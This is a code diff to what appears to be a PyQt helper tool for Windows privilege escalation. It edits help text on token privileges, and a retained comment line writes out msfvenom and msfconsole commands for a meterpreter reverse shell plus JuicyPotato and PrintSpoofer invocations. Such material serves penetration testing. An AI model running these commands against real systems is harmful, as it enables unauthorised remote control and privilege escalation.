@@ -150,13 +150,13 @@ class MainWindow(QMainWindow):
         help_title_text = "echo %username%"
         help_text = "\nThis command is used to display the username of the currently logged-in user in the Windows command prompt"
         self.show_help_window(help_text, help_title_text)
-
+	
     def wpe_1_Scan1_Help_Text(self):
         help_title_text = "whoami /priv"
-        help_text = "\nWhat are we looking for?\n\t\u2022 SeImpersonatePrivilege Enabled\n\t\u2022 SeTcbPrivilege Enabled\n\t\u2022 SeBackupPrivilege Enabled\n\t\u2022 SeRestorePrivilege Enabled\n\t\u2022 SeCreateTokenPrivilege Enabled\n\t\u2022 SeLoadDriverPrivilege\n\t\u2022 SeTakeOwnershipPrivilege Enabled\n\t\u2022 SeDebugPrivilege Enabled\n\nHow can we exploit this SeImpersonatePrivilege?\n\t\u2022 JuicyPotato\n\t\u2022 PrintSpoofer\n\nAre the tokens disabled?\n\t\u2022 https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1\n\t\u2022 . .\EnableAllTokenPrivs.ps1"
+        help_text = "\nWhat are we looking for?\n\t\u2022 SeImpersonatePrivilege Enabled\n\t\u2022 SeAssignPrimaryPrivilege\n\t\u2022 SeTcbPrivilege Enabled\n\t\u2022 SeBackupPrivilege Enabled\n\t\u2022 SeRestorePrivilege Enabled\n\t\u2022 SeCreateTokenPrivilege Enabled\n\t\u2022 SeLoadDriverPrivilege\n\t\u2022 SeTakeOwnershipPrivilege Enabled\n\t\u2022 SeDebugPrivilege Enabled\n\nHow can we exploit SeImpersonatePrivilege?\n\t\u2022 JuicyPotato\n\t\u2022 PrintSpoofer"
         #- This privilege allows a user to impersonate another user or process, which could be used to bypass access controls or gain unauthorized access to resources\n\nExploit - Juicy Potato\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe\nmsfconsole -x \"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST " + self.lhost + ";set LPORT " + self.lport + ";run;\"\nJuicy.Potato.x86.exe -l " + self.lport + " -p C:\path\\to\\shell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}\n\nExploit - PrintSpoofer\n.\PrintSpoofer64.exe -i -c cmd.exe"
         self.show_help_window(help_text, help_title_text)
-	
+
     def show_settings(self):
         self.settings_popup = QDialog(self)
         self.settings_popup.setStyleSheet("background-color: #161219;")        
